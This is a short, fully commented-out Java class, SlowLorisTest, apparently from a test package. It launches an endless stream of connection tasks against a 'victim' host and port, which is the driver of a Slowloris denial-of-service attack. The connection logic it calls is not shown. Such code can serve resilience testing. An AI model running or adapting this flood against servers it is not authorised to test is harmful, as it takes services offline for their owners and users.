/*

package testFiles;

import java.util.concurrent.TimeUnit;



import testFiles.Connector;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;


public class SlowLorisTest extends Thread {
	private String host;
	private int port;
	private int interval;
	private BlockingQueue<Runnable> workQ;
	private ThreadPoolExecutor executor;

	public SlowLorisTest(String victim, int port, int interval, int numConnections) {
		this.host = victim;
		this.port = port;
		this.interval = interval;
		workQ = new ArrayBlockingQueue<Runnable>(numConnections);
		executor = new ThreadPoolExecutor(numConnections, numConnections + 10, interval + 200, TimeUnit.MILLISECONDS, workQ, new ThreadPoolExecutor.DiscardPolicy());
	}

	@Override
	public void run() {
		while (true) {
			executor.submit(new Connection(host, port, interval));
			if (isInterrupted()) {
				break;
			}
		}
		executor.shutdown();
		try {
			executor.awaitTermination(1000, TimeUnit.MILLISECONDS);
		} catch (InterruptedException e) {
			executor.shutdownNow();
			Thread.currentThread().interrupt();
		}
	}
}

*/